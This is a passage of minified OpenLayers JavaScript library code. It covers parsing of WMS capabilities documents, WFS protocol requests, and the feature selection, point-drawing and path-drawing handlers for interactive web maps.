c},OnlineResource:function(a,b){b.href=this.getAttributeNS(a,this.namespaces.xlink,\"href\")},ContactInformation:function(a,b){b.contactInformation={};this.readChildNodes(a,b.contactInformation)},ContactPersonPrimary:function(a,b){b.personPrimary={};this.readChildNodes(a,b.personPrimary)},ContactPerson:function(a,b){b.person=this.getChildValue(a)},ContactOrganization:function(a,b){b.organization=this.getChildValue(a)},ContactPosition:function(a,b){b.position=this.getChildValue(a)},ContactAddress:function(a,\nb){b.contactAddress={};this.readChildNodes(a,b.contactAddress)},AddressType:function(a,b){b.type=this.getChildValue(a)},Address:function(a,b){b.address=this.getChildValue(a)},City:function(a,b){b.city=this.getChildValue(a)},StateOrProvince:function(a,b){b.stateOrProvince=this.getChildValue(a)},PostCode:function(a,b){b.postcode=this.getChildValue(a)},Country:function(a,b){b.country=this.getChildValue(a)},ContactVoiceTelephone:function(a,b){b.phone=this.getChildValue(a)},ContactFacsimileTelephone:function(a,\nb){b.fax=this.getChildValue(a)},ContactElectronicMailAddress:function(a,b){b.email=this.getChildValue(a)},Fees:function(a,b){var c=this.getChildValue(a);c&&\"none\"!=c.toLowerCase()&&(b.fees=c)},AccessConstraints:function(a,b){var c=this.getChildValue(a);c&&\"none\"!=c.toLowerCase()&&(b.accessConstraints=c)},Capability:function(a,b){b.capability={nestedLayers:[],layers:[]};this.readChildNodes(a,b.capability)},Request:function(a,b){b.request={};this.readChildNodes(a,b.request)},GetCapabilities:function(a,\nb){b.getcapabilities={formats:[]};this.readChildNodes(a,b.getcapabilities)},Format:function(a,b){OpenLayers.Util.isArray(b.formats)?b.formats.push(this.getChildValue(a)):b.format=this.getChildValue(a)},DCPType:function(a,b){this.readChildNodes(a,b)},HTTP:function(a,b){this.readChildNodes(a,b)},Get:function(a,b){b.get={};this.readChildNodes(a,b.get);b.href||(b.href=b.get.href)},Post:function(a,b){b.post={};this.readChildNodes(a,b.post);b.href||(b.href=b.get.href)},GetMap:function(a,b){b.getmap={formats:[]};\nthis.readChildNodes(a,b.getmap)},GetFeatureInfo:function(a,b){b.getfeatureinfo={formats:[]};this.readChildNodes(a,b.getfeatureinfo)},Exception:function(a,b){b.exception={formats:[]};this.readChildNodes(a,b.exception)},Layer:function(a,b){var c,d;b.capability?(d=b.capability,c=b):d=b;var e=a.getAttributeNode(\"queryable\"),f=e&&e.specified?a.getAttribute(\"queryable\"):null,g=(e=a.getAttributeNode(\"cascaded\"))&&e.specified?a.getAttribute(\"cascaded\"):null,e=(e=a.getAttributeNode(\"opaque\"))&&e.specified?\na.getAttribute(\"opaque\"):null,h=a.getAttribute(\"noSubsets\"),k=a.getAttribute(\"fixedWidth\"),l=a.getAttribute(\"fixedHeight\"),m=c||{},n=OpenLayers.Util.extend;c={nestedLayers:[],styles:c?[].concat(c.styles):[],srs:c?n({},m.srs):{},metadataURLs:[],bbox:c?n({},m.bbox):{},llbbox:m.llbbox,dimensions:c?n({},m.dimensions):{},authorityURLs:c?n({},m.authorityURLs):{},identifiers:{},keywords:[],queryable:f&&\"\"!==f?\"1\"===f||\"true\"===f:m.queryable||!1,cascaded:null!==g?parseInt(g):m.cascaded||0,opaque:e?\"1\"===\ne||\"true\"===e:m.opaque||!1,noSubsets:null!==h?\"1\"===h||\"true\"===h:m.noSubsets||!1,fixedWidth:null!=k?parseInt(k):m.fixedWidth||0,fixedHeight:null!=l?parseInt(l):m.fixedHeight||0,minScale:m.minScale,maxScale:m.maxScale,attribution:m.attribution};b.nestedLayers.push(c);c.capability=d;this.readChildNodes(a,c);delete c.capability;c.name&&(f=c.name.split(\":\"),g=d.request,e=g.getfeatureinfo,0<f.length&&(c.prefix=f[0]),d.layers.push(c),void 0===c.formats&&(c.formats=g.getmap.formats),void 0===c.infoFormats&&\ne&&(c.infoFormats=e.formats))},Attribution:function(a,b){b.attribution={};this.readChildNodes(a,b.attribution)},LogoURL:function(a,b){b.logo={width:a.getAttribute(\"width\"),height:a.getAttribute(\"height\")};this.readChildNodes(a,b.logo)},Style:function(a,b){var c={};b.styles.push(c);this.readChildNodes(a,c)},LegendURL:function(a,b){var c={width:a.getAttribute(\"width\"),height:a.getAttribute(\"height\")};b.legend=c;this.readChildNodes(a,c)},MetadataURL:function(a,b){var c={type:a.getAttribute(\"type\")};\nb.metadataURLs.push(c);this.readChildNodes(a,c)},DataURL:function(a,b){b.dataURL={};this.readChildNodes(a,b.dataURL)},FeatureListURL:function(a,b){b.featureListURL={};this.readChildNodes(a,b.featureListURL)},AuthorityURL:function(a,b){var c=a.getAttribute(\"name\"),d={};this.readChildNodes(a,d);b.authorityURLs[c]=d.href},Identifier:function(a,b){var c=a.getAttribute(\"authority\");b.identifiers[c]=this.getChildValue(a)},KeywordList:function(a,b){this.readChildNodes(a,b)},SRS:function(a,b){b.srs[this.getChildValue(a)]=\n!0}}},CLASS_NAME:\"OpenLayers.Format.WMSCapabilities.v1\"});OpenLayers.Format.WMSCapabilities.v1_1=OpenLayers.Class(OpenLayers.Format.WMSCapabilities.v1,{readers:{wms:OpenLayers.Util.applyDefaults({WMT_MS_Capabilities:function(a,b){this.readChildNodes(a,b)},Keyword:function(a,b){b.keywords&&b.keywords.push(this.getChildValue(a))},DescribeLayer:function(a,b){b.describelayer={formats:[]};this.readChildNodes(a,b.describelayer)},GetLegendGraphic:function(a,b){b.getlegendgraphic={formats:[]};this.readChildNodes(a,b.getlegendgraphic)},GetStyles:function(a,b){b.getstyles=\n{formats:[]};this.readChildNodes(a,b.getstyles)},PutStyles:function(a,b){b.putstyles={formats:[]};this.readChildNodes(a,b.putstyles)},UserDefinedSymbolization:function(a,b){var c={supportSLD:1==parseInt(a.getAttribute(\"SupportSLD\")),userLayer:1==parseInt(a.getAttribute(\"UserLayer\")),userStyle:1==parseInt(a.getAttribute(\"UserStyle\")),remoteWFS:1==parseInt(a.getAttribute(\"RemoteWFS\"))};b.userSymbols=c},LatLonBoundingBox:function(a,b){b.llbbox=[parseFloat(a.getAttribute(\"minx\")),parseFloat(a.getAttribute(\"miny\")),\nparseFloat(a.getAttribute(\"maxx\")),parseFloat(a.getAttribute(\"maxy\"))]},BoundingBox:function(a,b){var c=OpenLayers.Format.WMSCapabilities.v1.prototype.readers.wms.BoundingBox.apply(this,[a,b]);c.srs=a.getAttribute(\"SRS\");b.bbox[c.srs]=c},ScaleHint:function(a,b){var c=a.getAttribute(\"min\"),d=a.getAttribute(\"max\"),e=Math.pow(2,0.5),f=OpenLayers.INCHES_PER_UNIT.m;0!=c&&(b.maxScale=parseFloat((c/e*f*OpenLayers.DOTS_PER_INCH).toPrecision(13)));d!=Number.POSITIVE_INFINITY&&(b.minScale=parseFloat((d/e*f*\nOpenLayers.DOTS_PER_INCH).toPrecision(13)))},Dimension:function(a,b){var c={name:a.getAttribute(\"name\").toLowerCase(),units:a.getAttribute(\"units\"),unitsymbol:a.getAttribute(\"unitSymbol\")};b.dimensions[c.name]=c},Extent:function(a,b){var c=a.getAttribute(\"name\").toLowerCase();if(c in b.dimensions){c=b.dimensions[c];c.nearestVal=\"1\"===a.getAttribute(\"nearestValue\");c.multipleVal=\"1\"===a.getAttribute(\"multipleValues\");c.current=\"1\"===a.getAttribute(\"current\");c[\"default\"]=a.getAttribute(\"default\")||\n\"\";var d=this.getChildValue(a);c.values=d.split(\",\")}}},OpenLayers.Format.WMSCapabilities.v1.prototype.readers.wms)},CLASS_NAME:\"OpenLayers.Format.WMSCapabilities.v1_1\"});OpenLayers.Format.WMSCapabilities.v1_1_0=OpenLayers.Class(OpenLayers.Format.WMSCapabilities.v1_1,{version:\"1.1.0\",readers:{wms:OpenLayers.Util.applyDefaults({SRS:function(a,b){for(var c=this.getChildValue(a).split(/ +/),d=0,e=c.length;d<e;d++)b.srs[c[d]]=!0}},OpenLayers.Format.WMSCapabilities.v1_1.prototype.readers.wms)},CLASS_NAME:\"OpenLayers.Format.WMSCapabilities.v1_1_0\"});OpenLayers.Protocol.WFS.v1=OpenLayers.Class(OpenLayers.Protocol,{version:null,srsName:\"EPSG:4326\",featureType:null,featureNS:null,geometryName:\"the_geom\",schema:null,featurePrefix:\"feature\",formatOptions:null,readFormat:null,readOptions:null,initialize:function(a){OpenLayers.Protocol.prototype.initialize.apply(this,[a]);a.format||(this.format=OpenLayers.Format.WFST(OpenLayers.Util.extend({version:this.version,featureType:this.featureType,featureNS:this.featureNS,featurePrefix:this.featurePrefix,geometryName:this.geometryName,\nsrsName:this.srsName,schema:this.schema},this.formatOptions)));!a.geometryName&&1<parseFloat(this.format.version)&&this.setGeometryName(null)},destroy:function(){this.options&&!this.options.format&&this.format.destroy();this.format=null;OpenLayers.Protocol.prototype.destroy.apply(this)},read:function(a){OpenLayers.Protocol.prototype.read.apply(this,arguments);a=OpenLayers.Util.extend({},a);OpenLayers.Util.applyDefaults(a,this.options||{});var b=new OpenLayers.Protocol.Response({requestType:\"read\"}),\nc=OpenLayers.Format.XML.prototype.write.apply(this.format,[this.format.writeNode(\"wfs:GetFeature\",a)]);b.priv=OpenLayers.Request.POST({url:a.url,callback:this.createCallback(this.handleRead,b,a),params:a.params,headers:a.headers,data:c});return b},setFeatureType:function(a){this.featureType=a;this.format.featureType=a},setGeometryName:function(a){this.geometryName=a;this.format.geometryName=a},handleRead:function(a,b){b=OpenLayers.Util.extend({},b);OpenLayers.Util.applyDefaults(b,this.options);if(b.callback){var c=\na.priv;200<=c.status&&300>c.status?(c=this.parseResponse(c,b.readOptions))&&!1!==c.success?(b.readOptions&&\"object\"==b.readOptions.output?OpenLayers.Util.extend(a,c):a.features=c,a.code=OpenLayers.Protocol.Response.SUCCESS):(a.code=OpenLayers.Protocol.Response.FAILURE,a.error=c):a.code=OpenLayers.Protocol.Response.FAILURE;b.callback.call(b.scope,a)}},parseResponse:function(a,b){var c=a.responseXML;c&&c.documentElement||(c=a.responseText);if(!c||0>=c.length)return null;c=null!==this.readFormat?this.readFormat.read(c):\nthis.format.read(c,b);if(!this.featureNS){var d=this.readFormat||this.format;this.featureNS=d.featureNS;d.autoConfig=!1;this.geometryName||this.setGeometryName(d.geometryName)}return c},commit:function(a,b){b=OpenLayers.Util.extend({},b);OpenLayers.Util.applyDefaults(b,this.options);var c=new OpenLayers.Protocol.Response({requestType:\"commit\",reqFeatures:a});c.priv=OpenLayers.Request.POST({url:b.url,headers:b.headers,data:this.format.write(a,b),callback:this.createCallback(this.handleCommit,c,b)});\nreturn c},handleCommit:function(a,b){if(b.callback){var c=a.priv,d=c.responseXML;d&&d.documentElement||(d=c.responseText);c=this.format.read(d)||{};a.insertIds=c.insertIds||[];c.success?a.code=OpenLayers.Protocol.Response.SUCCESS:(a.code=OpenLayers.Protocol.Response.FAILURE,a.error=c);b.callback.call(b.scope,a)}},filterDelete:function(a,b){b=OpenLayers.Util.extend({},b);OpenLayers.Util.applyDefaults(b,this.options);new OpenLayers.Protocol.Response({requestType:\"commit\"});var c=this.format.createElementNSPlus(\"wfs:Transaction\",\n{attributes:{service:\"WFS\",version:this.version}}),d=this.format.createElementNSPlus(\"wfs:Delete\",{attributes:{typeName:(b.featureNS?this.featurePrefix+\":\":\"\")+b.featureType}});b.featureNS&&d.setAttribute(\"xmlns:\"+this.featurePrefix,b.featureNS);var e=this.format.writeNode(\"ogc:Filter\",a);d.appendChild(e);c.appendChild(d);c=OpenLayers.Format.XML.prototype.write.apply(this.format,[c]);return OpenLayers.Request.POST({url:this.url,callback:b.callback||function(){},data:c})},abort:function(a){a&&a.priv.abort()},\nCLASS_NAME:\"OpenLayers.Protocol.WFS.v1\"});OpenLayers.Handler.Feature=OpenLayers.Class(OpenLayers.Handler,{EVENTMAP:{click:{\"in\":\"click\",out:\"clickout\"},mousemove:{\"in\":\"over\",out:\"out\"},dblclick:{\"in\":\"dblclick\",out:null},mousedown:{\"in\":null,out:null},mouseup:{\"in\":null,out:null},touchstart:{\"in\":\"click\",out:\"clickout\"}},feature:null,lastFeature:null,down:null,up:null,clickTolerance:4,geometryTypes:null,stopClick:!0,stopDown:!0,stopUp:!1,initialize:function(a,b,c,d){OpenLayers.Handler.prototype.initialize.apply(this,[a,c,d]);this.layer=\nb},touchstart:function(a){this.startTouch();return OpenLayers.Event.isMultiTouch(a)?!0:this.mousedown(a)},touchmove:function(a){OpenLayers.Event.preventDefault(a)},mousedown:function(a){if(OpenLayers.Event.isLeftClick(a)||OpenLayers.Event.isSingleTouch(a))this.down=a.xy;return this.handle(a)?!this.stopDown:!0},mouseup:function(a){this.up=a.xy;return this.handle(a)?!this.stopUp:!0},click:function(a){return this.handle(a)?!this.stopClick:!0},mousemove:function(a){if(!this.callbacks.over&&!this.callbacks.out)return!0;\nthis.handle(a);return!0},dblclick:function(a){return!this.handle(a)},geometryTypeMatches:function(a){return null==this.geometryTypes||-1<OpenLayers.Util.indexOf(this.geometryTypes,a.geometry.CLASS_NAME)},handle:function(a){this.feature&&!this.feature.layer&&(this.feature=null);var b=a.type,c=!1,d=!!this.feature,e=\"click\"==b||\"dblclick\"==b||\"touchstart\"==b;(this.feature=this.layer.getFeatureFromEvent(a))&&!this.feature.layer&&(this.feature=null);this.lastFeature&&!this.lastFeature.layer&&(this.lastFeature=\nnull);this.feature?(\"touchstart\"===b&&OpenLayers.Event.preventDefault(a),a=this.feature!=this.lastFeature,this.geometryTypeMatches(this.feature)?(d&&a?(this.lastFeature&&this.triggerCallback(b,\"out\",[this.lastFeature]),this.triggerCallback(b,\"in\",[this.feature])):d&&!e||this.triggerCallback(b,\"in\",[this.feature]),this.lastFeature=this.feature,c=!0):(this.lastFeature&&(d&&a||e)&&this.triggerCallback(b,\"out\",[this.lastFeature]),this.feature=null)):this.lastFeature&&(d||e)&&this.triggerCallback(b,\"out\",\n[this.lastFeature]);return c},triggerCallback:function(a,b,c){if(b=this.EVENTMAP[a][b])\"click\"==a&&this.up&&this.down?(Math.sqrt(Math.pow(this.up.x-this.down.x,2)+Math.pow(this.up.y-this.down.y,2))<=this.clickTolerance&&this.callback(b,c),this.up=this.down=null):this.callback(b,c)},activate:function(){var a=!1;OpenLayers.Handler.prototype.activate.apply(this,arguments)&&(this.moveLayerToTop(),this.map.events.on({removelayer:this.handleMapEvents,changelayer:this.handleMapEvents,scope:this}),a=!0);\nreturn a},deactivate:function(){var a=!1;OpenLayers.Handler.prototype.deactivate.apply(this,arguments)&&(this.moveLayerBack(),this.up=this.down=this.lastFeature=this.feature=null,this.map.events.un({removelayer:this.handleMapEvents,changelayer:this.handleMapEvents,scope:this}),a=!0);return a},handleMapEvents:function(a){\"removelayer\"!=a.type&&\"order\"!=a.property||this.moveLayerToTop()},moveLayerToTop:function(){var a=Math.max(this.map.Z_INDEX_BASE.Feature-1,this.layer.getZIndex())+1;this.layer.setZIndex(a)},\nmoveLayerBack:function(){var a=this.layer.getZIndex()-1;a>=this.map.Z_INDEX_BASE.Feature?this.layer.setZIndex(a):this.map.setLayerZIndex(this.layer,this.map.getLayerIndex(this.layer))},CLASS_NAME:\"OpenLayers.Handler.Feature\"});OpenLayers.Layer.Vector.RootContainer=OpenLayers.Class(OpenLayers.Layer.Vector,{displayInLayerSwitcher:!1,layers:null,display:function(){},getFeatureFromEvent:function(a){for(var b=this.layers,c,d=0;d<b.length;d++)if(c=b[d].getFeatureFromEvent(a))return c},setMap:function(a){OpenLayers.Layer.Vector.prototype.setMap.apply(this,arguments);this.collectRoots();a.events.register(\"changelayer\",this,this.handleChangeLayer)},removeMap:function(a){a.events.unregister(\"changelayer\",this,this.handleChangeLayer);\nthis.resetRoots();OpenLayers.Layer.Vector.prototype.removeMap.apply(this,arguments)},collectRoots:function(){for(var a,b=0;b<this.map.layers.length;++b)a=this.map.layers[b],-1!=OpenLayers.Util.indexOf(this.layers,a)&&a.renderer.moveRoot(this.renderer)},resetRoots:function(){for(var a,b=0;b<this.layers.length;++b)a=this.layers[b],this.renderer&&a.renderer.getRenderLayerId()==this.id&&this.renderer.moveRoot(a.renderer)},handleChangeLayer:function(a){var b=a.layer;\"order\"==a.property&&-1!=OpenLayers.Util.indexOf(this.layers,\nb)&&(this.resetRoots(),this.collectRoots())},CLASS_NAME:\"OpenLayers.Layer.Vector.RootContainer\"});OpenLayers.Control.SelectFeature=OpenLayers.Class(OpenLayers.Control,{multipleKey:null,toggleKey:null,multiple:!1,clickout:!0,toggle:!1,hover:!1,highlightOnly:!1,box:!1,onBeforeSelect:function(){},onSelect:function(){},onUnselect:function(){},scope:null,geometryTypes:null,layer:null,layers:null,callbacks:null,selectStyle:null,renderIntent:\"select\",handlers:null,initialize:function(a,b){OpenLayers.Control.prototype.initialize.apply(this,[b]);null===this.scope&&(this.scope=this);this.initLayer(a);var c=\n{click:this.clickFeature,clickout:this.clickoutFeature};this.hover&&(c.over=this.overFeature,c.out=this.outFeature);this.callbacks=OpenLayers.Util.extend(c,this.callbacks);this.handlers={feature:new OpenLayers.Handler.Feature(this,this.layer,this.callbacks,{geometryTypes:this.geometryTypes})};this.box&&(this.handlers.box=new OpenLayers.Handler.Box(this,{done:this.selectBox},{boxDivClassName:\"olHandlerBoxSelectFeature\"}))},initLayer:function(a){OpenLayers.Util.isArray(a)?(this.layers=a,this.layer=\nnew OpenLayers.Layer.Vector.RootContainer(this.id+\"_container\",{layers:a})):this.layer=a},destroy:function(){this.active&&this.layers&&this.map.removeLayer(this.layer);OpenLayers.Control.prototype.destroy.apply(this,arguments);this.layers&&this.layer.destroy()},activate:function(){this.active||(this.layers&&this.map.addLayer(this.layer),this.handlers.feature.activate(),this.box&&this.handlers.box&&this.handlers.box.activate());return OpenLayers.Control.prototype.activate.apply(this,arguments)},deactivate:function(){this.active&&\n(this.handlers.feature.deactivate(),this.handlers.box&&this.handlers.box.deactivate(),this.layers&&this.map.removeLayer(this.layer));return OpenLayers.Control.prototype.deactivate.apply(this,arguments)},unselectAll:function(a){var b=this.layers||[this.layer],c,d,e,f;for(e=0;e<b.length;++e)if(c=b[e],f=0,null!=c.selectedFeatures)for(;c.selectedFeatures.length>f;)d=c.selectedFeatures[f],a&&a.except==d?++f:this.unselect(d)},clickFeature:function(a){this.hover||(-1<OpenLayers.Util.indexOf(a.layer.selectedFeatures,\na)?this.toggleSelect()?this.unselect(a):this.multipleSelect()||this.unselectAll({except:a}):(this.multipleSelect()||this.unselectAll({except:a}),this.select(a)))},multipleSelect:function(){return this.multiple||this.handlers.feature.evt&&this.handlers.feature.evt[this.multipleKey]},toggleSelect:function(){return this.toggle||this.handlers.feature.evt&&this.handlers.feature.evt[this.toggleKey]},clickoutFeature:function(a){!this.hover&&this.clickout&&this.unselectAll()},overFeature:function(a){var b=\na.layer;this.hover&&(this.highlightOnly?this.highlight(a):-1==OpenLayers.Util.indexOf(b.selectedFeatures,a)&&this.select(a))},outFeature:function(a){if(this.hover)if(this.highlightOnly){if(a._lastHighlighter==this.id)if(a._prevHighlighter&&a._prevHighlighter!=this.id){delete a._lastHighlighter;var b=this.map.getControl(a._prevHighlighter);b&&b.highlight(a)}else this.unhighlight(a)}else this.unselect(a)},highlight:function(a){var b=a.layer;!1!==this.events.triggerEvent(\"beforefeaturehighlighted\",{feature:a})&&\n(a._prevHighlighter=a._lastHighlighter,a._lastHighlighter=this.id,b.drawFeature(a,this.selectStyle||this.renderIntent),this.events.triggerEvent(\"featurehighlighted\",{feature:a}))},unhighlight:function(a){var b=a.layer;void 0==a._prevHighlighter?delete a._lastHighlighter:(a._prevHighlighter!=this.id&&(a._lastHighlighter=a._prevHighlighter),delete a._prevHighlighter);b.drawFeature(a,a.style||a.layer.style||\"default\");this.events.triggerEvent(\"featureunhighlighted\",{feature:a})},select:function(a){var b=\nthis.onBeforeSelect.call(this.scope,a),c=a.layer;!1!==b&&(b=c.events.triggerEvent(\"beforefeatureselected\",{feature:a}),!1!==b&&(c.selectedFeatures.push(a),this.highlight(a),this.handlers.feature.lastFeature||(this.handlers.feature.lastFeature=c.selectedFeatures[0]),c.events.triggerEvent(\"featureselected\",{feature:a}),this.onSelect.call(this.scope,a)))},unselect:function(a){var b=a.layer;this.unhighlight(a);OpenLayers.Util.removeItem(b.selectedFeatures,a);b.events.triggerEvent(\"featureunselected\",\n{feature:a});this.onUnselect.call(this.scope,a)},selectBox:function(a){if(a instanceof OpenLayers.Bounds){var b=this.map.getLonLatFromPixel({x:a.left,y:a.bottom});a=this.map.getLonLatFromPixel({x:a.right,y:a.top});b=new OpenLayers.Bounds(b.lon,b.lat,a.lon,a.lat);this.multipleSelect()||this.unselectAll();a=this.multiple;this.multiple=!0;var c=this.layers||[this.layer];this.events.triggerEvent(\"boxselectionstart\",{layers:c});for(var d,e=0;e<c.length;++e){d=c[e];for(var f=0,g=d.features.length;f<g;++f){var h=\nd.features[f];h.getVisibility()&&(null==this.geometryTypes||-1<OpenLayers.Util.indexOf(this.geometryTypes,h.geometry.CLASS_NAME))&&b.toGeometry().intersects(h.geometry)&&-1==OpenLayers.Util.indexOf(d.selectedFeatures,h)&&this.select(h)}}this.multiple=a;this.events.triggerEvent(\"boxselectionend\",{layers:c})}},setMap:function(a){this.handlers.feature.setMap(a);this.box&&this.handlers.box.setMap(a);OpenLayers.Control.prototype.setMap.apply(this,arguments)},setLayer:function(a){var b=this.active;this.unselectAll();\nthis.deactivate();this.layers&&(this.layer.destroy(),this.layers=null);this.initLayer(a);this.handlers.feature.layer=this.layer;b&&this.activate()},CLASS_NAME:\"OpenLayers.Control.SelectFeature\"});OpenLayers.Handler.Point=OpenLayers.Class(OpenLayers.Handler,{point:null,layer:null,multi:!1,citeCompliant:!1,mouseDown:!1,stoppedDown:null,lastDown:null,lastUp:null,persist:!1,stopDown:!1,stopUp:!1,layerOptions:null,pixelTolerance:5,lastTouchPx:null,initialize:function(a,b,c){c&&c.layerOptions&&c.layerOptions.styleMap||(this.style=OpenLayers.Util.extend(OpenLayers.Feature.Vector.style[\"default\"],{}));OpenLayers.Handler.prototype.initialize.apply(this,arguments)},activate:function(){if(!OpenLayers.Handler.prototype.activate.apply(this,\narguments))return!1;var a=OpenLayers.Util.extend({displayInLayerSwitcher:!1,calculateInRange:OpenLayers.Function.True,wrapDateLine:this.citeCompliant},this.layerOptions);this.layer=new OpenLayers.Layer.Vector(this.CLASS_NAME,a);this.map.addLayer(this.layer);return!0},createFeature:function(a){a=this.layer.getLonLatFromViewPortPx(a);a=new OpenLayers.Geometry.Point(a.lon,a.lat);this.point=new OpenLayers.Feature.Vector(a);this.callback(\"create\",[this.point.geometry,this.point]);this.point.geometry.clearBounds();\nthis.layer.addFeatures([this.point],{silent:!0})},deactivate:function(){if(!OpenLayers.Handler.prototype.deactivate.apply(this,arguments))return!1;this.cancel();null!=this.layer.map&&(this.destroyFeature(!0),this.layer.destroy(!1));this.layer=null;return!0},destroyFeature:function(a){!this.layer||!a&&this.persist||this.layer.destroyFeatures();this.point=null},destroyPersistedFeature:function(){var a=this.layer;a&&1<a.features.length&&this.layer.features[0].destroy()},finalize:function(a){this.mouseDown=\n!1;this.lastTouchPx=this.lastUp=this.lastDown=null;this.callback(a?\"cancel\":\"done\",[this.geometryClone()]);this.destroyFeature(a)},cancel:function(){this.finalize(!0)},click:function(a){OpenLayers.Event.stop(a);return!1},dblclick:function(a){OpenLayers.Event.stop(a);return!1},modifyFeature:function(a){this.point||this.createFeature(a);a=this.layer.getLonLatFromViewPortPx(a);this.point.geometry.x=a.lon;this.point.geometry.y=a.lat;this.callback(\"modify\",[this.point.geometry,this.point,!1]);this.point.geometry.clearBounds();\nthis.drawFeature()},drawFeature:function(){this.layer.drawFeature(this.point,this.style)},getGeometry:function(){var a=this.point&&this.point.geometry;a&&this.multi&&(a=new OpenLayers.Geometry.MultiPoint([a]));return a},geometryClone:function(){var a=this.getGeometry();return a&&a.clone()},mousedown:function(a){return this.down(a)},touchstart:function(a){this.startTouch();this.lastTouchPx=a.xy;return this.down(a)},mousemove:function(a){return this.move(a)},touchmove:function(a){this.lastTouchPx=a.xy;\nreturn this.move(a)},mouseup:function(a){return this.up(a)},touchend:function(a){a.xy=this.lastTouchPx;return this.up(a)},down:function(a){this.mouseDown=!0;this.lastDown=a.xy;this.touch||this.modifyFeature(a.xy);this.stoppedDown=this.stopDown;return!this.stopDown},move:function(a){this.touch||this.mouseDown&&!this.stoppedDown||this.modifyFeature(a.xy);return!0},up:function(a){this.mouseDown=!1;this.stoppedDown=this.stopDown;if(!this.checkModifiers(a)||this.lastUp&&this.lastUp.equals(a.xy)||!this.lastDown||\n!this.passesTolerance(this.lastDown,a.xy,this.pixelTolerance))return!0;this.touch&&this.modifyFeature(a.xy);this.persist&&this.destroyPersistedFeature();this.lastUp=a.xy;this.finalize();return!this.stopUp},mouseout:function(a){OpenLayers.Util.mouseLeft(a,this.map.viewPortDiv)&&(this.stoppedDown=this.stopDown,this.mouseDown=!1)},passesTolerance:function(a,b,c){var d=!0;null!=c&&a&&b&&a.distanceTo(b)>c&&(d=!1);return d},CLASS_NAME:\"OpenLayers.Handler.Point\"});OpenLayers.Handler.Path=OpenLayers.Class(OpenLayers.Handler.Point,{line:null,maxVertices:null,doubleTouchTolerance:20,freehand:!1,freehandToggle:\"shiftKey\",timerId:null,redoStack:null,createFeature:function(a){a=this.layer.getLonLatFromViewPortPx(a);a=new OpenLayers.Geometry.Point(a.lon,a.lat);this.point=new OpenLayers.Feature.Vector(a);this.line=new OpenLayers.Feature.Vector(new OpenLayers.Geometry.LineString([this.point.geometry]));this.callback(\"create\",[this.point.geometry,this.getSketch()]);\nthis.point.geometry.clearBounds();this.layer.addFeatures([this.line,this.point],{silent:!0})},destroyFeature:function(a){OpenLayers.Handler.Point.prototype.destroyFeature.call(this,a);this.line=null},destroyPersistedFeature:function(){var a=this.layer;a&&2<a.features.length&&this.layer.features[0].destroy()},removePoint:function(){this.point&&this.layer.removeFeatures([this.point])},addPoint:function(a){this.layer.removeFeatures([this.point]);a=this.layer.getLonLatFromViewPortPx(a);this.point=new OpenLayers.Feature.Vector(new OpenLayers.Geometry.Point(a.lon,\na.lat));this.line.geometry.addComponent(this.point.geometry,this.line.geometry.components.length);this.layer.addFeatures([this.point]);this.callback(\"point\",[this.point.geometry,this.getGeometry()]);this.callback(\"modify\",[this.point.geometry,this.getSketch()]);this.drawFeature();delete this.redoStack},insertXY:function(a,b){this.line.geometry.addComponent(new OpenLayers.Geometry.Point(a,b),this.getCurrentPointIndex());this.drawFeature();delete this.redoStack},insertDeltaXY:function(a,b){var c=this.getCurrentPointIndex()-\n1,c=this.line.geometry.components[c];!c||(isNaN(c.x)||isNaN(c.y))||this.insertXY(c.x+a,c.y+b)},insertDirectionLength:function(a,b){a*=Math.PI/180;var c=b*Math.cos(a),d=b*Math.sin(a);this.insertDeltaXY(c,d)},insertDeflectionLength:function(a,b){var c=this.getCurrentPointIndex()-1;if(0<c){var d=this.line.geometry.components[c],c=this.line.geometry.components[c-1],d=Math.atan2(d.y-c.y,d.x-c.x);this.insertDirectionLength(180*d/Math.PI+a,b)}},getCurrentPointIndex:function(){return this.line.geometry.components.length-\n1},undo:function(){var a=this.line.geometry,b=a.components,c=this.getCurrentPointIndex()-1,d=b[c],e=a.removeComponent(d);e&&(this.touch&&0<c&&(b=a.components,a=b[c-1],c=this.getCurrentPointIndex(),b=b[c],b.x=a.x,b.y=a.y),this.redoStack||(this.redoStack=[]),this.redoStack.push(d),this.drawFeature());return e},redo:function(){var a=this.redoStack&&this.redoStack.pop();a&&(this.line.geometry.addComponent(a,this.getCurrentPointIndex()),this.drawFeature());return!!a},freehandMode:function(a){return this.freehandToggle&&\na[this.freehandToggle]?!this.freehand:this.freehand},modifyFeature:function(a,b){this.line||this.createFeature(a);var c=this.layer.getLonLatFromViewPortPx(a);this.point.geometry.x=c.lon;this.point.geometry.y=c.lat;this.callback(\"modify\",[this.point.geometry,this.getSketch(),b]);this.point.geometry.clearBounds();this.drawFeature()},drawFeature:function(){this.layer.drawFeature(this.line,this.style);this.layer.drawFeature(this.point,this.style)},getSketch:function(){return this.line},getGeometry:function(){var a=\nthis.line&&this.line.geometry;a&&this.multi&&(a=new OpenLayers.Geometry.MultiLineString([a]));return a},touchstart:function(a){if(this.timerId&&this.passesTolerance(this.lastTouchPx,a.xy,this.doubleTouchTolerance))return this.finishGeometry(),window.clearTimeout(this.timerId),this.timerId=null,!1;this.timerId&&(window.clearTimeout(this.timerId),this.timerId=null);this.timerId=window.setTimeout(OpenLayers.Function.bind(function(){this.timerId=null},this),300);return OpenLayers.Handler.Point.prototype.touchstart.call(this,\na)},down:function(a){var b=this.stopDown;this.freehandMode(a)&&(b=!0,this.touch&&(this.modifyFeature(a.xy,!!this.lastUp),OpenLayers.Event.stop(a)));this.touch||this.lastDown&&this.passesTolerance(this.lastDown,a.xy,this.pixelTolerance)||this.modifyFeature(a.xy,!!this.lastUp);this.mouseDown=!0;this.lastDown=a.xy;this.stoppedDown=b;return!b},move:function(a){if(this.stoppedDown&&this.freehandMode(a))return 